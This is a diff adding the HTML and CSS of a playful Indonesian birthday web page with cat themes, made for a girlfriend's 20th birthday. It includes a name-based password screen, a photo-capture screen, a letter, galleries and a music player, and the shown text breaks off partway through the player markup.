@@ -1,0 +1,1062 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, viewport-fit=cover">
+<title>Untuk Auliaa 🤍</title>
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,400;0,500;0,600;0,700;0,800;1,500;1,600&family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+
+<script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.9.2/dist/confetti.browser.min.js"></script>
+
+<style>
+:root{
+  --cream:             #E9D9B8;
+  --cream-soft:        #F1E3C4;
+  --cream-deep:        #DEC79B;
+  --blue:              #CDE9F7;
+  --blue-soft:         #E3F3FB;
+  --blue-deep:         #9FCFE8;
+  --blue-ink:          #5B94B8;
+  --blush:             #F3D9AE;
+  --gold:              #D9AE6E;
+  --lavender:          #DCEAF6;
+  --mint:              #E3F3FB;
+  --text-dark:         #4A3B2A;
+  --text-soft:         #8A7758;
+  --white-glass:       rgba(255,251,240,0.85);
+  --white-glass-strong: rgba(255,251,240,0.95);
+  --border-glass:      rgba(255,255,255,0.9);
+  --shadow-soft:       0 10px 30px -10px rgba(159,207,232,0.3);
+
+  --font-display: 'Playfair Display', serif;
+  --font-body: 'Plus Jakarta Sans', sans-serif;
+}
+
+*{ margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
+html{ scroll-behavior:smooth; }
+
+body{
+  font-family: var(--font-body);
+  color: var(--text-dark);
+  background: linear-gradient(160deg, var(--cream) 0%, var(--blue-soft) 55%, var(--cream-soft) 100%);
+  overflow-x:hidden;
+  min-height:100vh;
+  position:relative;
+  width: 100vw;
+}
+
+h1,h2,h3,h4{ font-family: var(--font-display); font-weight:600; color:var(--text-dark); }
+img{ max-width:100%; display:block; }
+button{ font-family:inherit; border:none; cursor:pointer; background:none; }
+a{ text-decoration:none; color:inherit; }
+
+::-webkit-scrollbar{ width:6px; }
+::-webkit-scrollbar-track{ background:var(--cream-soft); }
+::-webkit-scrollbar-thumb{ background:var(--blue-deep); border-radius:10px; }
+
+/* BACKGROUND ANIMATION */
+#bg-aurora{
+  position:fixed; inset:0; z-index:-3; overflow:hidden; pointer-events:none;
+  background: linear-gradient(160deg, var(--cream) 0%, var(--blue-soft) 50%, var(--cream-soft) 100%);
+}
+.blur-circle{
+  position:fixed; border-radius:50%; pointer-events:none; z-index:-2;
+  filter:blur(60px); opacity:0.5;
+}
+.blur-circle.c1{ width:50vw; height:50vw; top:5%; left:-20vw; background:var(--blue); }
+.blur-circle.c2{ width:50vw; height:50vw; bottom:0%; right:-20vw; background:var(--blush); }
+
+#bg-canvas{ position:fixed; inset:0; z-index:-1; pointer-events:none; }
+
+.paw-print{
+  position:fixed; font-size:22px; pointer-events:none; z-index:9999;
+  opacity:0.85; transform:translate(-50%,-50%) scale(0.8) rotate(var(--r,0deg));
+  animation: pawFade 1.2s ease-out forwards;
+}
+@keyframes pawFade{
+  0%{ opacity:0.9; transform:translate(-50%,-50%) scale(0.6) rotate(var(--r,0deg)); }
+  30%{ opacity:0.8; transform:translate(-50%,-50%) scale(1.1) rotate(var(--r,0deg)); }
+  100%{ opacity:0; transform:translate(-50%,-50%) scale(1.2) rotate(var(--r,0deg)) translateY(-15px); }
+}
+
+#walking-cat{
+  position:fixed; bottom:14px; left:-80px; font-size:32px; z-index:5; pointer-events:none;
+  animation: catWalk 24s linear infinite; animation-delay: 2s;
+  filter: drop-shadow(0 4px 6px rgba(0,0,0,0.12));
+}
+#walking-cat-2{
+  position:fixed; bottom:10px; left:-80px; font-size:24px; z-index:5; pointer-events:none;
+  animation: catWalk 32s linear infinite; animation-delay: 14s;
+  filter: drop-shadow(0 4px 6px rgba(0,0,0,0.12)); opacity:0.85;
+}
+@keyframes catWalk{
+  0%{ left:-10%; transform:scaleX(1) translateY(0); }
+  48%{ left:105%; transform:scaleX(1) translateY(-2px); }
+  50%{ left:105%; transform:scaleX(-1) translateY(0); opacity:0; }
+  51%{ left:105%; transform:scaleX(-1) translateY(0); opacity:1; }
+  99%{ left:-10%; transform:scaleX(-1) translateY(-2px); }
+  100%{ left:-10%; transform:scaleX(1); }
+}
+
+.cat-sticker{
+  display:inline-block; font-size:26px; animation: catStickerFloat 3.2s ease-in-out infinite;
+}
+@keyframes catStickerFloat{
+  0%,100%{ transform:translateY(0) rotate(-6deg); }
+  50%{ transform:translateY(-6px) rotate(6deg); }
+}
+
+.floating-paw{
+  position:fixed; z-index:-1; pointer-events:none; opacity:0.4; font-size:22px;
+  animation: pawFloat linear infinite;
+}
+@keyframes pawFloat{
+  0%{ transform: translateY(110vh) rotate(0deg); opacity:0; }
+  100%{ transform: translateY(-10vh) rotate(360deg); opacity:0; }
+}
+
+/* FULL WIDTH GLASS CARD */
+.glass-card{
+  background: var(--white-glass);
+  backdrop-filter: blur(20px) saturate(140%);
+  -webkit-backdrop-filter: blur(20px) saturate(140%);
+  border-top: 1px solid var(--border-glass);
+  border-bottom: 1px solid var(--border-glass);
+  box-shadow: var(--shadow-soft);
+  width: 100vw !important;
+  max-width: 100vw !important;
+  border-radius: 0 !important;
+  margin-left: calc(-50vw + 50%);
+  margin-right: calc(-50vw + 50%);
+}
+
+.btn-primary{
+  display:inline-flex; align-items:center; justify-content:center; gap:10px;
+  padding:16px 36px; border-radius:100px; font-weight:700; font-size:15px;
+  color:#fff; letter-spacing:0.3px;
+  background: linear-gradient(135deg, var(--blue-ink), var(--blue-deep));
+  box-shadow: 0 14px 30px -10px rgba(111,169,201,0.55);
+}
+
+.btn-ghost{
+  display:inline-flex; align-items:center; justify-content:center; gap:8px;
+  padding:14px 30px; border-radius:100px; font-weight:600; font-size:14px;
+  color:var(--text-dark); background:var(--white-glass-strong);
+  border:1px solid var(--border-glass);
+}
+
+.section-eyebrow{
+  font-size:12px; letter-spacing:3px; text-transform:uppercase; color:var(--blue-ink);
+  font-weight:700; margin-bottom:8px; display:flex; align-items:center; gap:8px; justify-content:center;
+}
+
+.cat-head-decor{
+  width:78px; height:66px; margin:0 auto -30px; position:relative; z-index:3;
+}
+.cat-head-decor .face{
+  width:100%; height:80%; background: linear-gradient(160deg,#fff, var(--blue-soft));
+  border-radius:50% 50% 46% 46%; position:absolute; bottom:0; border:1px solid var(--border-glass);
+}
+.cat-head-decor .ear{
+  width:0; height:0; position:absolute; top:-6px;
+  border-left:16px solid transparent; border-right:16px solid transparent; border-bottom:26px solid var(--blue-soft);
+}
+.cat-head-decor .ear.left{ left:6px; transform:rotate(-18deg); }
+.cat-head-decor .ear.right{ right:6px; transform:rotate(18deg); }
+.cat-head-decor .ear::after{
+  content:''; position:absolute; left:-9px; top:11px; width:0; height:0;
+  border-left:9px solid transparent; border-right:9px solid transparent; border-bottom:15px solid var(--blush);
+}
+.cat-head-decor .eye{
+  width:6px; height:9px; background:var(--text-dark); border-radius:50%; position:absolute; top:34px;
+}
+.cat-head-decor .eye.left{ left:22px; }
+.cat-head-decor .eye.right{ right:22px; }
+.cat-head-decor .nose{
+  width:6px; height:5px; background:var(--blush); border-radius:50%; position:absolute; top:44px; left:50%; transform:translateX(-50%);
+}
+
+/* SCREENS */
+.screen{
+  position:fixed; inset:0; z-index:100; display:none;
+  align-items:center; justify-content:center; padding:16px;
+  opacity:0; transition: opacity .7s ease;
+  background: linear-gradient(160deg, var(--cream) 0%, var(--blue-soft) 55%, var(--cream-soft) 100%);
+  width:100vw;
+}
+.screen.active{ display:flex; opacity:1; }
+.screen.fading-out{ opacity:0; pointer-events:none; }
+
+#main-screen{ display:none; flex-direction:column; align-items:stretch; min-height:auto; padding:0; position:relative; z-index:1; width:100vw; }
+#main-screen.active{ display:flex; }
+
+#splash-screen .splash-inner{ text-align:center; width:100vw !important; max-width:100vw !important; padding:40px 24px; border-radius: 0 !important; margin:0; }
+.splash-cards-container{
+  display:flex; justify-content:center; gap:14px; margin:0 auto 20px; width:100%; max-width:320px;
+}
+.splash-photo-card{
+  flex:1; height:140px; border-radius:12px; overflow:hidden;
+  border:4px solid #fff; box-shadow:0 10px 20px rgba(0,0,0,0.08); background:var(--blue-soft);
+}
+.splash-photo-card:nth-child(1){ transform:rotate(-4deg); }
+.splash-photo-card:nth-child(2){ transform:rotate(4deg); }
+.splash-photo-card img{ width:100%; height:100%; object-fit:cover; }
+
+#login-screen .login-card{ width:100vw !important; max-width:100vw !important; padding:40px 24px; text-align:center; border-radius: 0 !important; margin:0; }
+.pw-wrap input{
+  width:100%; max-width:340px; margin:0 auto; display:block; padding:16px 20px; border-radius:100px; border:1.5px solid rgba(159,207,232,0.5);
+  background:rgba(255,255,255,0.8); font-size:15px; text-align:center; color:var(--text-dark); outline:none;
+}
+
+#camera-screen .cam-card{ width:100vw !important; max-width:100vw !important; padding:30px 20px; text-align:center; border-radius: 0 !important; margin:0; }
+.cam-frame{
+  width:220px; height:220px; border-radius:50%; margin:0 auto 20px; overflow:hidden;
+  border:5px solid #fff; box-shadow: var(--shadow-soft); position:relative; background:var(--blue-soft);
+}
+.cam-frame video{
+  width:100%; height:100%; object-fit:cover; position:absolute; inset:0;
+  transform: scaleX(-1);
+}
+.cam-frame canvas, .cam-frame img{
+  width:100%; height:100%; object-fit:cover; position:absolute; inset:0;
+}
+
+/* MAIN CONTENT */
+.hero-section{
+  min-height:100vh; display:flex; flex-direction:column; align-items:center; justify-content:center;
+  position:relative; padding:80px 20px 50px; text-align:center; width: 100vw;
+}
+.avatar-wrap{
+  width:120px; height:120px; border-radius:50%; margin:0 auto 22px; position:relative;
+  border:5px solid #fff; box-shadow: var(--shadow-soft); overflow:hidden; background:var(--blue-soft);
+}
+.avatar-wrap img{ width:100%; height:100%; object-fit:cover; }
+.avatar-wrap .avatar-fallback{ width:100%; height:100%; display:flex; align-items:center; justify-content:center; font-size:45px; }
+
+.orbit-cat{ position:absolute; font-size:20px; animation: orbitFloat 5s ease-in-out infinite; }
+.orbit-cat.oc1{ top:-10px; left:-12px; }
+.orbit-cat.oc2{ top:-6px; right:-16px; animation-delay:1.2s; }
+.orbit-cat.oc3{ bottom:-12px; left:50%; transform:translateX(-50%); animation-delay:2.4s; }
+@keyframes orbitFloat{ 0%,100%{ transform:translateY(0) rotate(-6deg); } 50%{ transform:translateY(-8px) rotate(6deg); } }
+
+.content-section{ padding:70px 20px; position:relative; width:100vw; }
+.content-section h2.section-title{ text-align:center; font-size:clamp(26px,5vw,34px); margin-bottom:8px; }
+.section-desc{ text-align:center; color:var(--text-soft); font-size:14px; width:100%; margin:0 auto 35px; line-height:1.6; }
+
+.letter-card{ width:100vw !important; max-width:100vw !important; padding:45px 20px; position:relative; border-radius: 0 !important; margin:0; }
+.letter-body{ font-family: var(--font-display); font-size:clamp(15px,3.8vw,18px); line-height:1.9; color:var(--text-dark); white-space:pre-wrap; width:100%; }
+.letter-footer{ display:flex; justify-content:space-between; align-items:flex-end; margin-top:25px; flex-wrap:wrap; gap:12px; width:100%; }
+.letter-note{ font-style:italic; font-size:12px; color:var(--text-soft); }
+.letter-signoff{ font-style:italic; font-weight:700; color:var(--text-dark); font-size:15px; text-align:right; }
+
+/* SECRET JAR */
+.jar-wrap{ display:flex; flex-direction:column; align-items:center; width:100vw; }
+.jar{ width:140px; height:170px; position:relative; cursor:pointer; margin-bottom:8px; }
+.jar.shaking{ animation: jarShake 0.6s ease-in-out 3; }
+@keyframes jarShake{ 0%,100%{ transform:rotate(0); } 20%{ transform:rotate(-8deg); } 80%{ transform:rotate(8deg); } }
+.jar-lid{ width:65px; height:16px; background:linear-gradient(160deg,var(--gold),#d9ac72); margin:0 auto; border-radius:6px 6px 3px 3px; }
+.jar-body{
+  width:140px; height:154px; margin-top:-2px; border-radius:14px 14px 30px 30px;
+  background: linear-gradient(160deg, rgba(255,255,255,0.4), rgba(205,233,247,0.5) 45%);
+  border:2px solid rgba(255,255,255,0.8); display:flex; align-items:flex-end; justify-content:center; flex-wrap:wrap; gap:3px; padding:12px 10px;
+}
+.jar-paper{ width:14px; height:20px; background:#fff9ee; border-radius:2px; transform:rotate(var(--rot,0deg)); }
+
+.jar-note-popup{ position:fixed; inset:0; background:rgba(91,74,63,0.4); backdrop-filter: blur(6px); display:none; align-items:center; justify-content:center; z-index:500; padding:20px; width:100vw; }
+.jar-note-popup.show{ display:flex; }
+.jar-note-card{ width:100vw !important; max-width:100vw !important; padding:35px 24px; text-align:center; position:relative; border-radius: 0 !important; margin:0; }
+
+/* KERETA PELAN */
+.train-section{ padding: 50px 0 70px; overflow:hidden; position:relative; text-align:center; width:100vw; }
+.train-track-wrap{
+  width:100vw; position:relative; padding: 30px 0 20px;
+  background: linear-gradient(to bottom, transparent, rgba(227, 243, 251, 0.45) 60%, transparent);
+  border-top: 2px dashed rgba(255,255,255,0.8); border-bottom: 2px dashed rgba(255,255,255,0.8);
+}
+.train-moving-track{
+  display:flex; align-items:flex-end; gap:14px; width:max-content;
+  transform: translateX(100vw);
+  animation: trainMarquee 85s linear infinite;
+}
+.train-moving-track:hover{ animation-play-state: paused; }
+
+@keyframes trainMarquee{
+  0%{ transform: translateX(100vw); }
+  100%{ transform: translateX(calc(-100% - 50vw)); }
+}
+
+.train-unit{
+  position:relative; flex-shrink:0; display:flex; flex-direction:column; align-items:center;
+  animation: trainBob 1.5s ease-in-out infinite alternate;
+}
+.train-unit:nth-child(even){ animation-delay: 0.75s; }
+@keyframes trainBob{ 0%{ transform:translateY(0); } 100%{ transform:translateY(-4px); } }
+
+.loco-body{
+  width: 160px; height: 115px;
+  background: linear-gradient(135deg, var(--gold), #c89554);
+  border-radius: 65px 55px 30px 30px;
+  border: 3px solid #fff; box-shadow: var(--shadow-soft);
+  display:flex; flex-direction:column; align-items:center; justify-content:center;
+  position:relative; z-index:2;
+}
+.loco-head{ font-size:40px; line-height:1; margin-bottom:2px; }
+.loco-label{
+  font-family: var(--font-display); font-weight:800; font-size:10px;
+  color:#fff; background:var(--text-dark); padding:2px 8px; border-radius:10px;
+}
+.loco-ear{
+  position:absolute; top:-12px; width:0; height:0;
+  border-left:14px solid transparent; border-right:14px solid transparent; border-bottom:22px solid var(--gold);
+}
+.loco-ear.l{ left:16px; transform:rotate(-18deg); }
+.loco-ear.r{ right:16px; transform:rotate(18deg); }
+.loco-tail{
+  position:absolute; right:-16px; bottom:22px; width:28px; height:14px;
+  background:var(--gold); border-radius:0 14px 14px 0; border:2px solid #fff; border-left:none;
+  transform-origin:left center; animation:tailWag 1.2s ease-in-out infinite alternate;
+}
+@keyframes tailWag{ 0%{ transform:rotate(-25deg); } 100%{ transform:rotate(25deg); } }
+.loco-smoke{
+  position:absolute; top:-32px; left:25px; font-size:20px;
+  animation:smokePuff 2s ease-out infinite;
+}
+@keyframes smokePuff{
+  0%{ transform:translateY(0) scale(0.6); opacity:1; }
+  100%{ transform:translateY(-30px) translateX(-15px) scale(1.5); opacity:0; }
+}
+
+.train-wheels{
+  display:flex; justify-content:space-around; width:75%; margin:-10px auto 0;
+  position:relative; z-index:3;
+}
+.t-wheel{
+  width:24px; height:24px; border-radius:50%; background:var(--text-dark); border:3px solid #fff;
+  position:relative; animation:wheelSpin 1.8s linear infinite;
+}
+.t-wheel::after{
+  content:''; position:absolute; top:50%; left:50%; width:5px; height:5px;
+  background:var(--gold); border-radius:50%; transform:translate(-50%,-50%);
+}
+@keyframes wheelSpin{ 100%{ transform:rotate(-360deg); } }
+
+.carriage-body{
+  width:135px; height:110px; background:var(--white-glass-strong);
+  border:3px solid #fff; border-radius:16px; padding:6px;
+  box-shadow:var(--shadow-soft); position:relative; display:flex; align-items:center; justify-content:center;
+}
+.carriage-photo{ width:100%; height:100%; object-fit:cover; border-radius:10px; }
+.carriage-num{
+  position:absolute; top:-10px; left:50%; transform:translateX(-50%);
+  background:var(--blue-ink); color:#fff; font-size:10px; font-weight:800;
+  padding:2px 8px; border-radius:10px; border:2px solid #fff; z-index:4;
+}
+.train-connector{ width:16px; height:6px; background:var(--text-soft); margin-bottom:24px; flex-shrink:0; border-radius:3px; align-self:flex-end; }
+.train-gap-connector{ width:280px; height:6px; background:transparent; margin-bottom:24px; flex-shrink:0; align-self:flex-end; }
+
+/* VIDEO */
+.video-card{
+  width:100vw !important; max-width:100vw !important; padding:24px 20px; position:relative;
+  border-radius: 0 !important; text-align:center; margin:0;
+}
+.video-wrapper{
+  position:relative; width:100%; aspect-ratio: 9/16; border-radius:14px; overflow:hidden;
+  background:#000; box-shadow:0 10px 25px rgba(0,0,0,0.15); border:3px solid #fff;
+}
+.video-wrapper video{ width:100%; height:100%; display:block; object-fit:cover; background:#000; }
+
+/* GALERI 2 KOLOM RAPI */
+.gallery-grid{ 
+  display:grid; 
+  grid-template-columns: repeat(2, 1fr); 
+  gap:12px; 
+  width:100vw; 
+  padding: 0 16px; 
+}
+.flip-card{ perspective:1000px; height:190px; width:100%; }
+.flip-card-inner{ position:relative; width:100%; height:100%; transition: transform .8s cubic-bezier(.2,.8,.2,1); transform-style:preserve-3d; border-radius:14px; }
+.flip-card.flipped .flip-card-inner{ transform:rotateY(180deg); }
+.flip-front, .flip-back{ position:absolute; inset:0; backface-visibility:hidden; border-radius:14px; overflow:hidden; display:flex; align-items:center; justify-content:center; text-align:center; padding:12px; }
+.flip-front{ background:linear-gradient(150deg,var(--blue-soft),var(--cream-soft)); border:3px solid #fff; }
+.flip-front img{ width:100%; height:100%; object-fit:cover; position:absolute; inset:0; }
+.flip-back{ background: linear-gradient(150deg, var(--blue-ink), var(--blue-deep)); color:#fff; transform:rotateY(180deg); font-size:12.5px; font-family:var(--font-display); font-style:italic; border:3px solid #fff; }
+
+/* SURPRISE */
+.surprise-section{ text-align:center; padding-bottom:120px; width:100vw; }
+.surprise-photo-wrap{ width:100vw; max-width:100vw; margin:25px auto 0; padding: 0 20px; position:relative; }
+.surprise-cutout{ width:100%; border-radius:16px; opacity:0; transform:scale(0.9); transition: all 1s ease; border:5px solid #fff; }
+.surprise-cutout.show{ opacity:1; transform:scale(1); }
+
+/* FOOTER */
+.footer-final{ text-align:center; padding:70px 20px 110px; width:100vw; }
+.wa-btn{
+  display:inline-flex; align-items:center; gap:10px; padding:16px 30px; border-radius:100px;
+  background:linear-gradient(135deg,#5fca7d,#3fb765); color:#fff; font-weight:700; font-size:14.5px;
+  box-shadow:0 14px 28px -10px rgba(63,183,101,0.55);
+}
+.footer-signature{ margin-top:35px; font-size:13px; font-weight:700; color:var(--blue-ink); padding:0 10px; }
+
+/* MUSIC PLAYER */
+#music-player{
+  position:fixed; 
+  left:50% !important; 
+  bottom:16px !important; 
+  transform:translateX(-50%) !important; 
+  z-index:200;
+  width: calc(100vw - 32px) !important; 
+  max-width: 420px !important; 
+  padding:10px 16px; 
+  display:flex; 
+  align-items:center; 
+  gap:10px;
+  border-radius:100px !important; 
+  opacity:0; 
+  pointer-events:none; 
+  transition: opacity .6s ease;
+  background: var(--white-glass-strong); 
+  box-shadow: 0 10px 30px rgba(0,0,0,0.15);
+  margin:0 auto !important;
+}
+#music-player.show{ opacity:1; pointer-events:auto; }
+
+.mp-cover{
+  width:42px; height:42px; border-radius:50%; overflow:hidden; flex-shrink:0;
+  border:2px solid #fff; background:linear-gradient(135deg, var(--blue-deep), var(--blush));
+}
+.mp-cover img{ width:100%; height:100%; object-fit:cover; }
+.mp-cover.spin{ animation: coverSpin 6s linear infinite; }
+@keyframes coverSpin{ from{ transform:rotate(0deg);} to{ transform:rotate(360deg);} }
+
+.mp-info{ flex:1; min-width:0; display:flex; flex-direction:column; justify-content:center; }
+.mp-title{ font-size:12.5px; font-weight:700; color:var(--text-dark); line-height:1.2; }
+.mp-artist{ font-size:10.5px; color:var(--text-soft); margin-bottom:3px; }
+
+.mp-progress-row{ display:flex; align-items:center; gap:6px; }
+.mp-time{ font-size:9.5px; color:var(--text-soft); min-width:22px; font-weight:500; }
+
+#mpSeek, #mpVolume{
+  -webkit-appearance:none; height:4px; border-radius:10px;
+  background: var(--blue); outline:none; cursor:pointer;
+}
+#mpSeek{ flex:1; }
+#mpVolume{ width:50px; }
+
+#mpSeek::-webkit-slider-thumb, #mpVolume::-webkit-slider-thumb{
+  -webkit-appearance:none; width:11px; height:11px; border-radius:50%;
+  background: var(--blue-ink); cursor:pointer;
+}
+
+.mp-btn{
+  width:36px; height:36px; border-radius:50%; background:var(--blue-ink); color:#fff;
+  font-size:12px; display:flex; align-items:center; justify-content:center; flex-shrink:0;
+}
+.mp-vol{ display:flex; align-items:center; gap:4px; flex-shrink:0; }
+@media (max-width: 450px){ .mp-vol{ display:none; } }
+</style>
+</head>
+<body>
+
+<div id="bg-aurora"></div>
+<div class="blur-circle c1"></div>
+<div class="blur-circle c2"></div>
+<canvas id="bg-canvas"></canvas>
+<div id="walking-cat">🐈</div>
+<div id="walking-cat-2">🐱</div>
+
+<section id="splash-screen" class="screen active">
+  <div class="glass-card splash-inner">
+    <div class="splash-hearts">🤍🐾</div>
+    <div class="splash-cards-container">
+      <div class="splash-photo-card">
+        <img src="assets/splash1.jpg" alt="Foto Splash 1" onerror="this.src='https://images.unsplash.com/photo-1514888286974-6c03e2ca1dba?w=400';">
+      </div>
+      <div class="splash-photo-card">
+        <img src="assets/splash2.jpg" alt="Foto Splash 2" onerror="this.src='https://images.unsplash.com/photo-1533738363-b7f9aef128ce?w=400';">
+      </div>
+    </div>
+    <h1>Aloo Ndudutkuww 🤍</h1>
+    <p style="color:var(--text-soft); font-size:13.5px; margin-bottom:22px;">Bukan penipuan online kok, ini beneran hadiah khusus dari aku wkwk 🐾</p>
+    <button class="btn-primary" id="btnOpenSurprise">Buka Kejutan 🎁</button>
+  </div>
+</section>
+
+<section id="login-screen" class="screen">
+  <div class="glass-card login-card">
+    <div class="cat-head-decor">
+      <div class="ear left"></div><div class="ear right"></div>
+      <div class="face"></div>
+      <div class="eye left"></div><div class="eye right"></div>
+      <div class="nose"></div>
+    </div>
+    <h2 style="margin-top:28px; font-size:22px;">Kunci Rahasia 🔒</h2>
+    <p style="font-size:13px; color:var(--text-soft); margin-bottom:20px;">Masukkan nama pacarmu tersayangg 😽</p>
+    <div class="pw-wrap" style="margin-bottom:12px;">
+      <input type="password" id="pwInput" placeholder="••••••••" autocomplete="off">
+    </div>
+    <div id="loginMsg" style="height:18px; font-size:12.5px; color:#c17b8a; margin-bottom:10px;"></div>
+    <button class="btn-primary" id="btnLogin" style="width:100%; max-width:340px;">Masuk 🐾</button>
+    <div style="margin-top:18px; font-size:11.5px; color:var(--text-soft);">hmm… namanya 5 huruf, mulai dari huruf a 😉</div>
+  </div>
+</section>
+
+<section id="camera-screen" class="screen">
+  <div class="glass-card cam-card">
+    <h2>Pap Dulu Dong 📸</h2>
+    <p style="font-size:12.5px; color:var(--text-soft); margin-bottom:18px;">Wajib pap dulu ya biar avatarnya kamu banget 🐾</p>
+    <div class="cam-frame">
+      <video id="camVideo" autoplay playsinline muted></video>
+      <canvas id="camCanvas" style="display:none;"></canvas>
+      <img id="camPhoto" alt="Foto kamu" style="display:none;">
+    </div>
+    <div style="display:flex; gap:8px; justify-content:center; flex-wrap:wrap;">
+      <button class="btn-primary" id="btnTakePhoto">Ambil Foto 🐱</button>
+      <button class="btn-ghost" id="btnRetake" style="display:none;">Ulangi</button>
+      <button class="btn-primary" id="btnUsePhoto" style="display:none;">Lanjutkan 🤍</button>
+    </div>
+    <div id="camFallback" style="display:none; margin-top:16px;">
+      <p style="font-size:11.5px; color:var(--text-soft); margin-bottom:8px;">Kameranya gak bisa diakses — upload pap dari galeri aja ya 🐈</p>
+      <label class="btn-ghost" style="cursor:pointer; font-size:13px; padding:10px 20px;">
+        Pilih Foto dari Galeri 🖼️
+        <input type="file" id="camUploadInput" accept="image/*" style="display:none;">
+      </label>
+    </div>
+  </div>
+</section>
+
+<section id="main-screen">
+
+  <div class="hero-section" id="heroSection">
+    <div style="position:relative; width:120px; height:120px; margin:0 auto 22px;">
+      <div class="avatar-wrap" id="avatarWrap">
+        <div class="avatar-fallback">🐱</div>
+      </div>
+      <span class="orbit-cat oc1">🐾</span>
+      <span class="orbit-cat oc2">😺</span>
+      <span class="orbit-cat oc3">🐱</span>
+    </div>
+    <div class="section-eyebrow">🎂 Hari Spesial Auliaa 🎂</div>
+    <h1 style="font-size:clamp(28px,6.5vw,46px); margin-bottom:10px;">Happy 20th Birthday, <span style="color:var(--blue-ink); font-style:italic;">Auliaa</span> 🎂</h1>
+    <p style="font-size:14px; color:var(--text-soft); width:100%; line-height:1.6; margin-bottom:25px;">
+      Aulia Irmayanti, resmi 20 tahun hari ini, 24 Juli 2026 🥳<br>
+      Semoga hari ini dipenuhi tawa dan kebahagiaan.<br>
+      web receh ini dibuat khusus oleh arielyan buat ndudutt sayangg 🐾
+    </p>
+    <div style="font-size:11.5px; letter-spacing:2px; text-transform:uppercase; color:var(--text-soft);">
+      gulir kebawahh yaww ndudutt 👇🐾
+    </div>
+  </div>
+
+  <div class="content-section" id="letterSection">
+    <div class="glass-card letter-card">
+      <div class="cat-head-decor">
+        <div class="ear left"></div><div class="ear right"></div>
+        <div class="face"></div>
+        <div class="eye left"></div><div class="eye right"></div>
+        <div class="nose"></div>
+      </div>
+      <div class="section-eyebrow" style="margin-top:24px;">💌 Sepucuk Surat</div>
+      <div class="letter-body" id="letterBody"></div>
+      <div class="letter-footer">
+        <div class="letter-note">notes: ini bukan ai tapi dari hatiku ndut 🤍</div>
+        <div class="letter-signoff">From your beloved, Arielyan 💜</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="content-section">
+    <div class="section-eyebrow">🫙 Toples Rahasia</div>
+    <h2 class="section-title"><span class="cat-sticker">🐈</span> Secret Jar <span class="cat-sticker">🐾</span></h2>
+    <p class="section-desc">ndudut ketuk toplesnya, biarin dia bergoyang, lalu liat pesan apa yang keluar buat hari iniii.</p>
+    <div class="jar-wrap">
+      <div class="jar" id="secretJar">
+        <div class="jar-lid"></div>
+        <div class="jar-body" id="jarPapers"></div>
+      </div>
+      <div style="font-size:12px; color:var(--text-soft); margin-top:8px;">Ketuk toplesnya ✨</div>
+    </div>
+  </div>
+
+  <div class="train-section">
+    <div class="section-eyebrow">🚂 Tuut Tuut Meow Meow</div>
+    <h2 class="section-title" style="margin-bottom:8px;"><span class="cat-sticker">😻</span> Kereta Kucing Gendut 🚂</h2>
+    <p class="section-desc">
+      liatt tuu ndutt, lokomotif kucing gendotttnya lagi bawa 10 gerbong foto kenanganyaaa kitaa ❤️❤️<br>
+      <span style="font-size:11.5px; color:var(--blue-ink); font-weight:700;">(sentuhh ke keretanya biar berhenti sebentar 🐾)</span>
+    </p>
+    <div class="train-track-wrap">
+      <div class="train-moving-track" id="catTrainTrack"></div>
+    </div>
+  </div>
+
+  <div class="content-section" style="padding-bottom:20px;">
+    <div class="section-eyebrow">🎬 Momen Spesial</div>
+    <h2 class="section-title"><span class="cat-sticker">🎥</span> Videoo Gumushh <span class="cat-sticker">🐾</span></h2>
+    <p class="section-desc">puterr videonyaa ndutt lucuuu gemezz 😻❤️</p>
+    <div class="glass-card video-card">
+      <div class="cat-head-decor" style="margin-top:-44px; margin-bottom:14px;">
+        <div class="ear left"></div><div class="ear right"></div>
+        <div class="face"></div>
+        <div class="eye left"></div><div class="eye right"></div>
+        <div class="nose"></div>
+      </div>
+      <div class="video-wrapper">
+        <video id="togetherVideo" controls playsinline preload="metadata">
+          <source src="assets/video-kita.mp4" type="video/mp4">
+          Browser kamu tidak mendukung pemutaran video.
+        </video>
+      </div>
+    </div>
+  </div>
+
+  <div class="content-section" style="padding-top:10px;">
+    <div class="section-eyebrow">🖼️ Galeri Kenangan</div>
+    <h2 class="section-title"><span class="cat-sticker">😺</span> Momen Kita <span class="cat-sticker">🐱</span></h2>
+    <p class="section-desc">disentuhh yaa ndutt atau klik kartunya buatt baca pesan di baliknyaa🐾</p>
+    <div class="gallery-grid" id="galleryGrid"></div>
+  </div>
+
+  <div class="content-section surprise-section">
+    <div class="section-eyebrow">🎉 Satu Lagi</div>
+    <h2 class="section-title"><span class="cat-sticker">😻</span> Pap Paling Favorit Akoo <span class="cat-sticker">🐈</span></h2>
+    <p class="section-desc">ini foto favorit akuuu dari ndudutt, pencett tombolnyaa 🐾</p>
+    <button class="btn-primary" id="btnSurprise">Lihat Kejutan 🎁</button>
+    <div class="surprise-photo-wrap">
+      <img class="surprise-cutout" id="surpriseCutout" src="" alt="Pap favorit">
+      <p id="surpriseCaption" style="margin-top:12px; font-family:var(--font-display); font-style:italic; color:var(--text-soft); display:none; font-size:14px;">
+        Pap paling favorit akoo 🐱🤍
+      </p>
+    </div>
+  </div>
+
+  <div class="footer-final">
+    <div class="cat-head-decor">
+      <div class="ear left"></div><div class="ear right"></div>
+      <div class="face"></div>
+      <div class="eye left"></div><div class="eye right"></div>
+      <div class="nose"></div>
+    </div>
+    <h3 style="margin-top:24px; font-size:20px; margin-bottom:6px;">maaciww ndudutt dah liat sampe selesaii 🤍</h3>
+    <p style="color:var(--text-soft); font-size:13.5px; margin-bottom:20px;">Ada satu pesan terakhir menunggumu di WhatsApp.</p>
+    <a class="wa-btn" id="waBtn" href="#" target="_blank">💌 bales di whatsapp yaa</a>
+    <div class="footer-signature">Web receh ini dibuat khusus oleh arielyan buat ndudutt sayangg 🐾</div>
+  </div>
+
+</section>
+
+<div id="music-player" class="glass-card">
+  <div class="mp-cover" id="mpCover">
+    <img id="mpCoverImg" src="" alt="Cover Lagu" style="display:none;">
+  </div>
+  <div class="mp-info">
+    <div class="mp-title" id="mpTitle">Perfect</div>
